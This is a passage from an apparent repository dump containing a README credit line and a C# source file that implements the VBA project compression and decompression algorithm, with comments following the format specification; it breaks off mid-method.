contributions by Carrie Roberts ([@OrOneEqualsOne](https://twitter.com/OrOneEqualsOne) / Walmart).\n\nSpecial thanks to Nick Landers ([@monoxgas](https://twitter.com/monoxgas) / Silent Break Security) for pointing me towards OpenMCDF.\n"
        },
        {
          "name": "compression.cs",
          "type": "blob",
          "size": 39.4814453125,
          "content": "﻿using System;\nusing System.Diagnostics.Contracts;\nusing System.IO;\nusing System.Linq;\nusing System.Collections.Generic;\nusing System.Collections;\nusing System.Diagnostics;\nusing System.Text;\n\nnamespace Kavod.Vba.Compression\n{\n    /// <summary>\n    /// A CompressedChunk is a record that encodes all data from a DecompressedChunk (section \n    /// 2.4.1.1.3) in compressed format. A CompressedChunk has two parts: a CompressedChunkHeader \n    /// (section 2.4.1.1.5) followed by a CompressedChunkData (section 2.4.1.1.6). The number of bytes \n    /// in a CompressedChunk MUST be greater than or equal to 3. The number of bytes in a \n    /// CompressedChunk MUST be less than or equal to 4098.\n    /// </summary>\n    /// <remarks></remarks>\n    internal class CompressedChunk\n    {\n        internal CompressedChunk(DecompressedChunk decompressedChunk)\n        {\n//            Contract.Requires<ArgumentNullException>(decompressedChunk != null);\n//            Contract.Ensures(Header != null);\n//            Contract.Ensures(ChunkData != null);\n\n            ChunkData = new CompressedChunkData(decompressedChunk);\n            if (ChunkData.Size >= Globals.MaxBytesPerChunk)\n            {\n                ChunkData = new RawChunk(decompressedChunk.Data);\n            }\n            Header = new CompressedChunkHeader(ChunkData);\n        }\n\n        internal CompressedChunk(BinaryReader dataReader)\n        {\n//            Contract.Requires<ArgumentNullException>(dataReader != null);\n//            Contract.Ensures(Header != null);\n//            Contract.Ensures(ChunkData != null);\n\n            Header = new CompressedChunkHeader(dataReader);\n            if (Header.IsCompressed)\n            {\n                ChunkData = new CompressedChunkData(dataReader, Header.CompressedChunkDataSize);\n            }\n            else\n            {\n                ChunkData = new RawChunk(dataReader.ReadBytes(Header.CompressedChunkDataSize));\n            }\n        }\n\n        internal CompressedChunkHeader Header { get; }\n\n        internal IChunkData ChunkData { get; }\n\n        internal byte[] SerializeData()\n        {\n            var serializedHeader = Header.SerializeData();\n            var serializedChunkData = ChunkData.SerializeData();\n\n            var data = serializedHeader.Concat(serializedChunkData);\n            if (!Header.IsCompressed)\n            {\n                var dataLength = serializedHeader.LongLength + serializedChunkData.LongLength;\n                var paddingLength = Globals.NumberOfChunkHeaderBytes\n                                    + Globals.MaxBytesPerChunk\n                                    - dataLength;\n                var padding = Enumerable.Repeat(Globals.PaddingByte, (int)paddingLength);\n                data = data.Concat(padding);\n            }\n            return data.ToArray();\n        }\n    }\n\n    /// <summary>\n    /// If CompressedChunkHeader.CompressedChunkFlag (section 2.4.1.1.5) is 0b0, CompressedChunkData \n    /// contains an array of CompressedChunkHeader.CompressedChunkSize elements plus 3 bytes of \n    /// uncompressed data.  If CompressedChunkHeader CompressedChunkFlag is 0b1, CompressedChunkData \n    /// contains an array of TokenSequence (section 2.4.1.1.7) elements.\n    /// </summary>\n    /// <remarks></remarks>\n    internal class CompressedChunkData : IChunkData\n    {\n        private readonly List<TokenSequence> _tokensequences = new List<TokenSequence>();\n\n        internal CompressedChunkData(DecompressedChunk chunk)\n        {\n//            Contract.Requires<ArgumentNullException>(chunk != null);\n            \n            var tokens = Tokenizer.TokenizeUncompressedData(chunk.Data);\n            _tokensequences.AddRange(tokens.ToTokenSequences());\n        }\n\n        internal CompressedChunkData(BinaryReader dataReader, UInt16 compressedChunkDataSize)\n        {\n            var data = dataReader.ReadBytes(compressedChunkDataSize);\n\n            using (var reader = new BinaryReader(new MemoryStream(data)))\n            {\n                var position = 0;\n                while (reader.BaseStream.Position < reader.BaseStream.Length)\n                {\n                    var sequence = TokenSequence.GetFromCompressedData(reader, position);\n                    _tokensequences.Add(sequence);\n                    position += (int)sequence.Tokens.Sum(t => t.Length);\n                }\n            }\n        }\n\n        internal IEnumerable<TokenSequence> TokenSequences => _tokensequences;\n\n        public byte[] SerializeData()\n        {\n            // get data from TokenSequences.\n            var data = from t in _tokensequences\n                       from d in t.SerializeData()\n                       select d;\n            return data.ToArray();\n        }\n\n        // TODO this is probably really inefficient.\n        public int Size => SerializeData().Length;\n    }\n\n    internal class CompressedChunkHeader\n    {\n        internal CompressedChunkHeader(IChunkData chunkData)\n        {\n            IsCompressed = chunkData is CompressedChunkData;\n            CompressedChunkSize = (ushort) (chunkData.Size + 2);\n        }\n\n        internal CompressedChunkHeader(UInt16 header)\n        {\n            DecodeHeader(header);\n        }\n\n        internal CompressedChunkHeader(BinaryReader dataReader)\n        {\n            var header = dataReader.ReadUInt16();\n            DecodeHeader(header);\n        }\n\n        private void DecodeHeader(UInt16 header)\n        {\n            var temp = (UInt16)(header & 0xf000);\n            switch (temp)\n            {\n                case 0xb000:\n                    IsCompressed = true;\n                    break;\n\n                case 0x3000:\n                    IsCompressed = false;\n                    break;\n\n                default:\n                    throw new Exception();\n            }\n\n            // 2.4.1.3.12 Extract CompressedChunkSize\n            // SET temp TO Header BITWISE AND 0x0FFF\n            // SET Size TO temp PLUS 3\n            CompressedChunkSize = (UInt16)((header & 0xfff) + 3);\n\n            ValidateChunkSizeAndCompressedFlag();\n        }\n\n        internal bool IsCompressed { get; private set; }\n\n        internal UInt16 CompressedChunkSize { get; private set; }\n\n        internal UInt16 CompressedChunkDataSize => (UInt16)(CompressedChunkSize - 2);\n\n        internal byte[] SerializeData()\n        {\n            ValidateChunkSizeAndCompressedFlag();\n\n            UInt16 header;\n            if (IsCompressed)\n            {\n                header = (UInt16)(0xb000 | (CompressedChunkSize - 3));\n            }\n            else\n            {\n                header = (UInt16)(0x3000 | (CompressedChunkSize - 3));\n            }\n            return BitConverter.GetBytes(header);\n        }\n\n        private void ValidateChunkSizeAndCompressedFlag()\n        {\n            if (IsCompressed \n                && CompressedChunkSize > 4098)\n            {\n                throw new Exception();\n            }\n            if (!IsCompressed \n                && CompressedChunkSize != 4098)\n            {\n                throw new Exception();\n            }\n        }\n    }\n\n    /// <summary>\n    /// A CompressedContainer is an array of bytes holding the compressed data. The Decompression \n    /// algorithm (section 2.4.1.3.1) processes a CompressedContainer to populate a DecompressedBuffer. \n    /// The Compression algorithm (section 2.4.1.3.6) processes a DecompressedBuffer to produce a \n    /// CompressedContainer.  A CompressedContainer MUST be the last array of bytes in a stream (1). \n    /// On read, the end of stream (1) indicator determines when the entire CompressedContainer has \n    /// been read.  The CompressedContainer is a SignatureByte followed by array of CompressedChunk \n    /// (section 2.4.1.1.4) structures.\n    /// </summary>\n    /// <remarks></remarks>\n    internal class CompressedContainer\n    {\n        private const byte SignatureByteSig = 0x1;\n\n        private readonly List<CompressedChunk> _compressedChunks = new List<CompressedChunk>();\n        \n        internal CompressedContainer(byte[] compressedData)\n        {\n            var reader = new BinaryReader(new MemoryStream(compressedData));\n\n            if (reader.ReadByte() != SignatureByteSig)\n            {\n                throw new Exception();\n            }\n\n            while (reader.BaseStream.Position < reader.BaseStream.Length)\n            {\n                _compressedChunks.Add(new CompressedChunk(reader));\n            }\n        }\n\n        internal CompressedContainer(DecompressedBuffer buffer)\n        {\n            foreach (var chunk in buffer.DecompressedChunks)\n            {\n                _compressedChunks.Add(new CompressedChunk(chunk));\n            }\n        }\n\n        internal IEnumerable<CompressedChunk> CompressedChunks => _compressedChunks;\n\n        internal byte[] SerializeData()\n        {\n            using (var writer = new BinaryWriter(new MemoryStream()))\n            {\n                writer.Write(SignatureByteSig);\n\n                foreach (var chunk in CompressedChunks)\n                {\n                    writer.Write(chunk.SerializeData());\n                }\n\n                using (var reader = new BinaryReader(writer.BaseStream))\n                {\n                    reader.BaseStream.Position = 0;\n                    return reader.ReadBytes((int) reader.BaseStream.Length);\n                }\n            }\n        }\n    }\n\n    /// <summary>\n    /// CopyToken is a two-byte record interpreted as an unsigned 16-bit integer in little-endian \n    /// order. A CopyToken is a compressed encoding of an array of bytes from a DecompressedChunk \n    /// (section 2.4.1.1.3). The byte array encoded by a CopyToken is a byte-for-byte copy of a byte \n    /// array elsewhere in the same DecompressedChunk, called a CopySequence (section 2.4.1.3.19).  \n    /// \n    /// The starting location, in a DecompressedChunk, is determined by the Compressing a Token \n    /// (section 2.4.1.3.9) and the Decompressing a Token (section 2.4.1.3.5) algorithms. Packed into \n    /// the CopyToken is the Offset, the distance, in byte count, to the beginning of the CopySequence. \n    /// Also packed into the CopyToken is the Length, the number of bytes encoded in the CopyToken. \n    /// Length also specifies the count of bytes in the CopySequence. The values encoded in Offset and \n    /// Length are computed by the Matching (section 2.4.1.3.19.4) algorithm.\n    /// </summary>\n    /// <remarks></remarks>\n    internal class CopyToken : IToken, IEquatable<CopyToken>\n    {\n        private readonly UInt16 _tokenOffset;\n        private readonly UInt16 _tokenLength;\n\n        /// <summary>\n        /// Constructor used to create a CopyToken when compressing a DecompressedChunk.\n        /// </summary>\n        /// <param name=\"tokenPosition\">\n        /// The start position of the CopyToken decompressed data in the current DecompressedChunk.\n        /// </param>\n        /// <param name=\"tokenOffset\">\n        /// The offset in bytes from the start position in the current DecompressedChunk from which to \n        /// start copying.\n        /// </param>\n        /// <param name=\"tokenLength\">The number of bytes to copy from the offset.</param>\n        /// <remarks></remarks>\n\n        internal CopyToken(long tokenPosition, UInt16 tokenOffset, UInt16 tokenLength)\n        {\n            Position = tokenPosition;\n            _tokenOffset = tokenOffset;\n            _tokenLength = tokenLength;\n        }\n\n        /// <summary>\n        /// Constructor used to create CopyToken instance when reading compressed token from a stream.\n        /// </summary>\n        /// <param name=\"dataReader\">\n        /// A BinaryReader object where the position is located at an encoded CopyToken.\n        /// </param>\n        /// <remarks></remarks>\n        internal CopyToken(BinaryReader dataReader, long position)\n        {\n            Position = position;\n            CopyToken.UnPack(dataReader.ReadUInt16(), Position, out _tokenOffset, out _tokenLength);\n        }\n\n        public long Length => _tokenLength;\n\n        internal UInt16 Offset => _tokenOffset;\n\n        internal long Position { get; }\n\n        internal static UInt16 Pack(long position, UInt16 offset, UInt16 length)\n        {\n            // 2.4.1.3.19.3 Pack CopyToken\n            var result = CopyTokenHelp(position);\n\n            if (length > result.MaximumLength)\n                throw new Exception();\n\n            //SET temp1 TO Offset MINUS 1\n            var temp1 = (UInt16)(offset - 1);\n\n            //SET temp2 TO 16 MINUS BitCount\n            var temp2 = (UInt16)(16 - result.BitCount);\n\n            //SET temp3 TO Length MINUS 3\n            var temp3 = (UInt16)(length - 3);\n\n            //SET Token TO (temp1 LEFT SHIFT BY temp2) BITWISE OR temp3\n            return (UInt16)((temp1 << temp2) | temp3);\n        }\n\n        public void DecompressToken(BinaryWriter writer)\n        {\n            // It is possible that the length is greater than the offset which means we would need to\n            // read more bytes than are available.  To handle this we need to read the bytes available\n            // (ie Offset amount) and then pad the remaining length with copies of the data read from \n            // the beginning of the buffer.\n\n            var streamPosition = writer.BaseStream.Position;\n            var reader = new BinaryReader(writer.BaseStream, Encoding.Unicode, true);\n            reader.BaseStream.Position = streamPosition - _tokenOffset;\n            var copySequence = reader.ReadBytes(Math.Min(_tokenOffset, _tokenLength));\n\n            Array.Resize(ref copySequence, _tokenLength);\n\n            for (int i = _tokenOffset; i <= _tokenLength - 1; i++)\n            {\n                var copyByte = copySequence[i % _tokenOffset];\n                copySequence[i] = copyByte;\n            }\n\n            // Move the position of the underlying stream back to the original position and write the\n            // CopySequence.\n            writer.BaseStream.Position = streamPosition;\n            writer.Write(copySequence);\n        }\n\n        internal static void UnPack(UInt16 packedToken, long position, out UInt16 unpackedOffset, out UInt16 unpackedLength)\n        {\n            // CALL CopyToken Help (section 2.4.1.3.19.1) returning LengthMask, OffsetMask, and BitCount.\n            var result = CopyToken.CopyTokenHelp(position);\n\n            // SET Length TO (Token BITWISE AND LengthMask) PLUS 3.\n            unpackedLength = (UInt16)((packedToken & result.LengthMask) + 3);\n\n            // SET temp1 TO Token BITWISE AND OffsetMask.\n            var temp1 = (UInt16)(packedToken & result.OffsetMask);\n\n            // SET temp2 TO 16 MINUS BitCount.\n            var temp2 = (UInt16)(16 - result.BitCount);\n\n            // SET Offset TO (temp1 RIGHT SHIFT BY temp2) PLUS 1.\n            unpackedOffset = (UInt16)((temp1 >> temp2) + 1);\n        }\n\n        /// <summary>\n        /// CopyToken Help derived bit masks are used by the Unpack CopyToken (section 2.4.1.3.19.2) \n        /// and the Pack CopyToken (section 2.4.1.3.19.3) algorithms. CopyToken Help also derives the \n        /// maximum length for a CopySequence (section 2.4.1.3.19) which is used by the Matching \n        /// algorithm (section 2.4.1.3.19.4).\n        /// The pseudocode uses the state variables described in State Variables (section 2.4.1.2): \n        /// DecompressedCurrent and DecompressedChunkStart.\n        /// </summary>\n        internal static CopyTokenHelpResult CopyTokenHelp(long difference)\n        {\n            var result = new CopyTokenHelpResult();\n\n            // SET BitCount TO the smallest integer that is GREATER THAN OR EQUAL TO LOGARITHM base 2 \n            // of difference\n            result.BitCount = 0;\n            while ((1 << result.BitCount) < difference)\n            {\n                result.BitCount += 1;\n            }\n\n            // The number of bits used to encode Length MUST be greater than or equal to four. The \n            // number of bits used to encode Length MUST be less than or equal to 12\n            // SET BitCount TO the maximum of BitCount and 4\n            if (result.BitCount < 4)\n                result.BitCount = 4;\n            if (result.BitCount > 12)\n                throw new Exception();\n\n            // SET LengthMask TO 0xFFFF RIGHT SHIFT BY BitCount\n            result.LengthMask = (UInt16)(0xffff >> result.BitCount);\n\n            // SET OffsetMask TO BITWISE NOT LengthMask\n            result.OffsetMask = (UInt16)(~result.LengthMask);\n\n            // SET MaximumLength TO (0xFFFF RIGHT SHIFT BY BitCount) PLUS 3\n            result.MaximumLength = (UInt16)((0xffff >> result.BitCount) + 3);\n\n            return result;\n        }\n\n        public byte[] SerializeData()\n        {\n            var packedData = Pack(Position, _tokenOffset, _tokenLength);\n            return BitConverter.GetBytes(packedData);\n        }\n\n        #region Nested Classes\n\n        internal struct CopyTokenHelpResult\n        {\n            internal UInt16 LengthMask { get; set; }\n            internal UInt16 OffsetMask { get; set; }\n            internal UInt16 BitCount { get; set; }  // offset bit count.\n            internal UInt16 MaximumLength { get; set; }\n            internal UInt16 LengthBitCount => (UInt16)(16 - BitCount);\n        }\n\n        #endregion\n\n        #region IEquatable\n        public static bool operator !=(CopyToken first, CopyToken second)\n        {\n            return !(first == second);\n        }\n\n        public static bool operator ==(CopyToken first, CopyToken second)\n        {\n            return Equals(first, second);\n        }\n\n        public override bool Equals(object obj)\n        {\n            return Equals(obj as CopyToken);\n        }\n\n        public bool Equals(IToken other)\n        {\n            return Equals(other as CopyToken);\n        }\n\n        public bool Equals(CopyToken other)\n        {\n            if (ReferenceEquals(other, null))\n            {\n                return false;\n            }\n            return other.Position == Position\n                   && other.Length == Length\n                   && other.Offset == Offset;\n        }\n\n        public override int GetHashCode()\n        {\n            return Position.GetHashCode() ^ Length.GetHashCode() ^ Offset.GetHashCode();\n        }\n        #endregion\n    }\n\n    /// <summary>\n    /// The DecompressedBuffer is a resizable array of bytes that contains the same data as the \n    /// CompressedContainer (section 2.4.1.1.1), but the data is in an uncompressed format.\n    /// </summary>\n    /// <remarks></remarks>\n    internal class DecompressedBuffer\n    {\n        internal DecompressedBuffer(byte[] uncompressedData)\n        {\n            using (var reader = new BinaryReader(new MemoryStream(uncompressedData)))\n            {\n                while (reader.BaseStream.Position < reader.BaseStream.Length)\n                {\n                    var chunk = new DecompressedChunk(reader);\n                    DecompressedChunks.Add(chunk);\n                }\n            }\n        }\n\n        internal DecompressedBuffer(CompressedContainer container)\n        {\n            foreach (var chunk in container.CompressedChunks)\n            {\n                DecompressedChunks.Add(new DecompressedChunk(chunk));\n            }\n        }\n\n        internal List<DecompressedChunk> DecompressedChunks { get; } = new List<DecompressedChunk>();\n\n        internal byte[] Data\n        {\n            get\n            {\n                using (var writer = new BinaryWriter(new MemoryStream()))\n                {\n                    foreach (var chunk in DecompressedChunks)\n                    {\n                        writer.Write(chunk.Data);\n                    }\n\n                    using (var reader = new BinaryReader(writer.BaseStream))\n                    {\n                        reader.BaseStream.Position = 0;\n\n                        return reader.ReadBytes((int) reader.BaseStream.Length);\n                    }\n                }\n            }\n        }\n    }\n\n    /// <summary>\n    /// A DecompressedChunk is a resizable array of bytes in the DecompressedBuffer \n    /// (section 2.4.1.1.2). The byte array is the data from a CompressedChunk (section 2.4.1.1.4) in \n    /// uncompressed format.\n    /// </summary>\n    /// <remarks></remarks>\n    internal class DecompressedChunk\n    {\n        internal DecompressedChunk(CompressedChunk compressedChunk)\n        {\n            if (compressedChunk.Header.IsCompressed)\n            {\n                // Loop through all the data, get TokenSequences and decompress them.\n                using (var writer = new BinaryWriter(new MemoryStream()))\n                {\n                    var tokens = ((CompressedChunkData)compressedChunk.ChunkData).TokenSequences;\n                    foreach (var sequence in tokens)\n                    {\n                        sequence.Tokens.DecompressTokenSequence(writer);\n                    }\n\n                    var stream = (MemoryStream)writer.BaseStream;\n                    var decompressedData = stream.GetBuffer();\n                    Array.Resize(ref decompressedData, (int)stream.Length);\n\n                    Data = decompressedData;\n                }\n            }\n            else\n            {\n                Data = compressedChunk.ChunkData.SerializeData();\n            }\n        }\n\n        internal DecompressedChunk(BinaryReader reader)\n        {\n            var bytesToRead = reader.BaseStream.Length - reader.BaseStream.Position;\n\n            if (bytesToRead > Globals.MaxBytesPerChunk)\n                bytesToRead = Globals.MaxBytesPerChunk;\n\n            Data = reader.ReadBytes((int) bytesToRead);\n        }\n\n        internal byte[] Data { get; }\n    }\n\n    internal static class Extensions\n    {\n        [DebuggerStepThrough]\n        internal static byte[] ToMcbsBytes(this string textToConvert, UInt16 codePage)\n        {\n            return Encoding.GetEncoding(codePage).GetBytes(textToConvert);\n        }\n\n        // http://stackoverflow.com/questions/321370/convert-hex-string-to-byte-array\n        internal static byte[] StringToByteArray(string hex)\n        {\n            return Enumerable.Range(0, hex.Length)\n                             .Where(x => x % 2 == 0)\n                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))\n                             .ToArray();\n        }\n    }\n\n    internal static class Globals\n    {\n        internal const int MaxBytesPerChunk = 4096;\n        internal const int NumberOfChunkHeaderBytes = 2;\n        internal const byte PaddingByte = 0x0;\n    }\n\n    internal interface IChunkData\n    {\n        byte[] SerializeData();\n\n        int Size { get; }\n    }\n\n    internal interface IToken : IEquatable<IToken>\n    {\n        void DecompressToken(BinaryWriter writer);\n\n        byte[] SerializeData();\n\n        long Length { get; }\n    }\n\n    /// <summary>\n    /// A LiteralToken is a copy of one byte, in uncompressed format, from the DecompressedBuffer \n    /// (section 2.4.1.1.2).\n    /// </summary>\n    /// <remarks></remarks>\n    internal class LiteralToken : IToken, IEquatable<LiteralToken>\n    {\n        private readonly byte[] _data;\n\n        internal LiteralToken(BinaryReader dataReader)\n        {\n            _data = dataReader.ReadBytes(1);\n        }\n\n        internal LiteralToken(byte data)\n        {\n            _data = new [] { data };\n        }\n\n        public void DecompressToken(BinaryWriter writer)\n        {\n            writer.Write(_data);\n            writer.Flush();\n        }\n\n        public byte[] SerializeData()\n        {\n            return _data;\n        }\n\n        public long Length => 1L;\n\n        #region IEquatable\n        public static bool operator !=(LiteralToken first, LiteralToken second)\n        {\n            return !(first == second);\n        }\n\n        public static bool operator ==(LiteralToken first, LiteralToken second)\n        {\n            return Equals(first, second);\n        }\n\n        public override bool Equals(object obj)\n        {\n            return Equals(obj as LiteralToken);\n        }\n\n        public bool Equals(IToken other)\n        {\n            return Equals(other as LiteralToken);\n        }\n\n        public bool Equals(LiteralToken other)\n        {\n            if (ReferenceEquals(other, null))\n            {\n                return false;\n            }\n            return other._data.SequenceEqual(_data);\n        }\n\n        public override int GetHashCode()\n        {\n            return _data.GetHashCode();\n        }\n        #endregion\n    }\n\n    internal class RawChunk : IChunkData\n    {\n        private readonly byte[] _data;\n\n        public RawChunk(byte[] data)\n        {\n            _data = data;\n        }\n\n        public byte[] SerializeData()\n        {\n            return _data;\n        }\n\n        public int Size => _data.Length;\n    }\n\n    internal static class Tokenizer\n    {\n        internal static IEnumerable<TokenSequence> ToTokenSequences(this IEnumerable<IToken> tokens)\n        {\n            var accumulatedTokens = new List<IToken>();\n            foreach (var t in tokens)\n            {\n                if (accumulatedTokens.Count == 8)\n                {\n                    yield return new TokenSequence(accumulatedTokens);\n                    accumulatedTokens.Clear();\n                }\n                accumulatedTokens.Add(t);\n            }\n            if (accumulatedTokens.Count != 0)\n            {\n                yield return new TokenSequence(accumulatedTokens);\n            }\n        }\n\n        internal static void DecompressTokenSequence(this IEnumerable<IToken> tokens, BinaryWriter writer)\n        {\n            foreach (var token in tokens)\n            {\n                token.DecompressToken(writer);\n            }\n        }\n\n        internal static bool OverlapsWith(this CopyToken thisToken, CopyToken otherToken)\n        {\n            var firstToken = thisToken;\n            var secondToken = otherToken;\n            if (thisToken.Position > otherToken.Position)\n            {\n                firstToken = otherToken;\n                secondToken = thisToken;\n            }\n//            Contract.Assert(firstToken.Position <= secondToken.Position);\n\n            return firstToken.Position + firstToken.Length > secondToken.Position;\n        }\n\n        internal static bool Contains(this CopyToken thisToken, CopyToken otherToken)\n        {\n            var otherTokenStartsAfterThisToken = thisToken.Position <= otherToken.Position;\n            var otherTokenEndsBeforeThisToken = thisToken.Position + thisToken.Length >=\n                                                otherToken.Position + otherToken.Length;\n            return otherTokenStartsAfterThisToken && otherTokenEndsBeforeThisToken;\n        }\n\n        internal static IEnumerable<IToken> TokenizeUncompressedData(byte[] uncompressedData)\n        {\n            // The commented code is alternative to the specification for the compression.\n            //var possibleCopyTokens = AllPossibleCopyTokens(uncompressedData);\n            //var normalCopyTokens = NormalizeCopyTokens(possibleCopyTokens);\n            //var allTokens = WeaveTokens(normalCopyTokens, uncompressedData);\n\n            var copyTokens = GetSpecificationCopyTokens(uncompressedData);\n            var allTokens = WeaveTokens(copyTokens, uncompressedData);\n            foreach (var t in allTokens)\n            {\n                yield return t;\n            }\n        }\n\n        private static IEnumerable<CopyToken> GetSpecificationCopyTokens(byte[] uncompressedData)\n        {\n            var position = 0L;\n            while (position < uncompressedData.Length)\n            {\n                UInt16 offset = 0;\n                UInt16 length = 0;\n                Match(uncompressedData, position, out offset, out length);\n\n                if (length > 0)\n                {\n                    yield return new CopyToken(position, offset, length);\n                    position += length;\n                }\n                else\n                {\n                    position++;\n                }\n            }\n        }\n\n        private static IEnumerable<CopyToken> AllPossibleCopyTokens(byte[] uncompressedData)\n        {\n            var position = 0L;\n            while (position < uncompressedData.Length)\n            {\n                UInt16 offset = 0;\n                UInt16 length = 0;\n                Match(uncompressedData, position, out offset, out length);\n                \n                if (length > 0)\n                {\n                    yield return new CopyToken(position, offset, length);\n                }\n                position++;\n            }\n        }\n\n        private static IEnumerable<CopyToken> NormalizeCopyTokens(IEnumerable<CopyToken> copyTokens)\n        {\n            var remainingTokens = RemoveRedundantTokens(copyTokens).ToList();\n\n            remainingTokens = RemoveOverlappingTokens(remainingTokens).ToList();\n\n            return remainingTokens;\n        }\n\n        private static IEnumerable<CopyToken> RemoveRedundantTokens(IEnumerable<CopyToken> tokens)\n        {\n            CopyToken previous = null;\n            foreach (var next in tokens)\n            {\n                if (previous == null)\n                {\n                    previous = next;\n                    continue;\n                }\n                if (previous.OverlapsWith(next))\n                {\n                    //figure out which one to keep.  There can only be one!\n                    if (previous.Length >= next.Length)\n                    {\n                        yield return previous;\n                        // can't return next.\n                    }\n                    else\n                    {\n                        yield return next;\n                    }\n                }\n                else\n                {\n                    yield return previous;\n                    previous = next;\n                }\n            }\n        }\n\n        private static IEnumerable<CopyToken> RemoveOverlappingTokens(IEnumerable<CopyToken> tokens)\n        {\n            // create a list of the current tokens.\n            Node list = null;\n            foreach (var t in tokens.Reverse())\n            {\n                list = new Node(t, list);\n            }\n//            Contract.Assert(list != null);\n\n            return FindBestPath(list);\n        }\n\n        private static Node FindBestPath(Node node)\n        {\n//            Contract.Requires<ArgumentNullException>(node != null);\n\n            // find any overlapping tokens\n            Node bestPath = null;\n            foreach (var overlappingNode in GetOverlappingNodes(node))\n            {\n                var currentPath = new Node(overlappingNode.Value, null);\n\n                // find the next non-overlapping node.\n                var nonOverlappingNode = GetNextNonOverlappingNode(overlappingNode);\n                if (nonOverlappingNode != null)\n                {\n                    currentPath.NextNode = FindBestPath(nonOverlappingNode);\n                }\n\n                if (bestPath == null \n                    || bestPath.Length < currentPath.Length)\n                {\n                    bestPath = currentPath;\n                }\n            }\n            return bestPath;\n        }\n\n        private static IEnumerable<Node> GetOverlappingNodes(Node node)\n        {\n//            Contract.Requires<ArgumentNullException>(node != null);\n\n            var firstNode = node;\n\n            while (node != null \n                && firstNode.Value.OverlapsWith(node.Value))\n            {\n                yield return node;\n                node = node.NextNode;\n            }\n        }\n\n        private static Node GetNextNonOverlappingNode(Node node)\n        {\n//            Contract.Requires<ArgumentNullException>(node != null);\n\n            var firstNode = node;\n\n            while (node != null \n                && firstNode.Value.OverlapsWith(node.Value))\n            {\n                node = node.NextNode;\n            }\n            return node;\n        }\n\n        private static IEnumerable<IToken> WeaveTokens(IEnumerable<CopyToken> copyTokens, byte[] uncompressedData)\n        {\n            var position = 0L;\n            foreach (var currentCopyToken in copyTokens)\n            {\n                while (position < currentCopyToken.Position)\n                {\n                    yield return new LiteralToken(uncompressedData[position]);\n                    position++;\n                }\n                yield return currentCopyToken;\n                position += currentCopyToken.Length;\n            }\n            while (position < uncompressedData.Length)\n            {\n                yield return new LiteralToken(uncompressedData[position]);\n                position++;\n            }\n        }\n\n        internal static void Match(byte[] uncompressedData, long position, out UInt16 matchedOffset, out UInt16 matchedLength)\n        {\n            var decompressedCurrent = position;\n            var decompressedEnd = uncompressedData.Length;\n            const long decompressedChunkStart = 0;\n\n            // SET Candidate TO DecompressedCurrent MINUS 1\n            var candidate = decompressedCurrent - 1L;\n            // SET BestLength TO 0\n            var bestLength = 0L;\n            var bestCandidate = 0L;\n\n            // WHILE Candidate is GREATER THAN OR EQUAL TO DecompressedChunkStart\n            while (candidate >= decompressedChunkStart)\n            {\n                // SET C TO Candidate\n                var c = candidate;\n                // SET D TO DecompressedCurrent\n                var d = decompressedCurrent;\n                // SET Len TO 0\n                var len = 0;\n\n                // WHILE (D is LESS THAN DecompressedEnd)\n                // and (the byte at D EQUALS the byte at C)\n                while (d < decompressedEnd\n                       && uncompressedData[d] == uncompressedData[c])\n                {\n                    // INCREMENT Len\n                    len++;\n                    // INCREMENT C\n                    c++;\n                    // INCREMENT D\n                    d++;\n                } // END WHILE\n\n                // IF Len is GREATER THAN BestLength THEN\n                if (len > bestLength)\n                {\n                    // SET BestLength TO Len\n                    bestLength = len;\n                    // SET BestCandidate TO Candidate\n                    bestCandidate = candidate;\n                } // ENDIF\n\n                // DECREMENT Candidate\n                candidate--;\n            } // END WHILE\n\n            // IF BestLength is GREATER THAN OR EQUAL TO 3 THEN\n            if (bestLength >= 3)\n            {\n                // CALL CopyToken Help (section 2.4.1.3.19.1) returning MaximumLength\n                var result = CopyToken.CopyTokenHelp(decompressedCurrent);\n\n                // SET Length TO the MINIMUM of BestLength and MaximumLength\n                matchedLength = (UInt16)bestLength;\n                if (bestLength > result.MaximumLength)\n                    matchedLength = result.MaximumLength;\n\n                // SET Offset TO DecompressedCurrent MINUS BestCandidate\n                matchedOffset = (UInt16)(decompressedCurrent - bestCandidate);\n            }\n            else // ELSE\n            {\n                // SET Length TO 0\n                matchedLength = 0;\n                // SET Offset TO 0\n                matchedOffset = 0;\n            } // ENDIF\n        }\n\n        //region Private Classes\n\n        private class Node : IEnumerable<CopyToken>\n        {\n            public Node(CopyToken value, Node nextNode)\n            {\n//                Contract.Requires<ArgumentNullException>(value != null);\n\n                Value = value;\n                NextNode = nextNode;\n            }\n\n            internal CopyToken Value { get; }\n\n            internal Node NextNode { get; set; }\n\n            internal long Length\n            {\n                get\n                {\n                    if (NextNode != null)\n                    {\n                        return Value.Length + NextNode.Length;\n                    }\n                    return Value.Length;\n                }\n            }\n\n            public IEnumerator<CopyToken> GetEnumerator()\n            {\n                return new NodeEnumerator(this);\n            }\n\n            IEnumerator IEnumerable.GetEnumerator()\n            {\n                return GetEnumerator();\n            }\n        }\n\n        private class NodeEnumerator : IEnumerator<CopyToken>\n        {\n            private Node _currentNode;\n            private Node _nextNode;\n\n            public NodeEnumerator(Node node)\n            {\n                _nextNode = node;\n            }\n\n            public void Dispose()\n            {\n            }\n\n            public bool MoveNext()\n            {\n                if (_nextNode == null)\n                {\n                    return false;\n                }\n                _currentNode = _nextNode;\n                _nextNode = _nextNode.NextNode;\n                return true;\n            }\n\n            public void Reset()\n            {\n                throw new NotSupportedException();\n            }\n\n            public CopyToken Current => _currentNode.Value;\n\n            object IEnumerator.Current => Current;\n        }\n\n        //endregion\n    }\n\n    /// <summary>\n    /// A TokenSequence is a FlagByte followed by an array of Tokens. The number of Tokens in the final \n    /// TokenSequence MUST be greater than or equal to 1. The number of Tokens in the final \n    /// TokenSequence MUST less than or equal to eight. All other TokenSequences in the \n    /// CompressedChunkData MUST contain eight Tokens.\n    /// </summary>\n    /// <remarks></remarks>\n    internal class TokenSequence\n    {\n        private byte _flagByte;\n        private readonly List<IToken> _tokens = new List<IToken>();\n\n        public TokenSequence(IEnumerable<IToken> enumerable) : this()\n        {\n            _tokens.AddRange(enumerable);\n            \n//            Contract.Assert(_tokens.Count > 0);\n//            Contract.Assert(_tokens.Count <= 8);\n            \n            // set the flag byte.\n            for (var i = 0; i < _tokens.Count; i++)\n            {\n                if (_tokens[i] is CopyToken)\n                {\n                    SetIsCopyToken(i, true);\n                }\n            }\n        }\n\n        private TokenSequence()\n        { }\n\n        internal long Length => Tokens.Sum(t => t.Length);\n\n        internal IReadOnlyList<IToken> Tokens => _tokens;\n\n        internal static TokenSequence GetFromCompressedData(BinaryReader reader, long position)\n        {\n            var 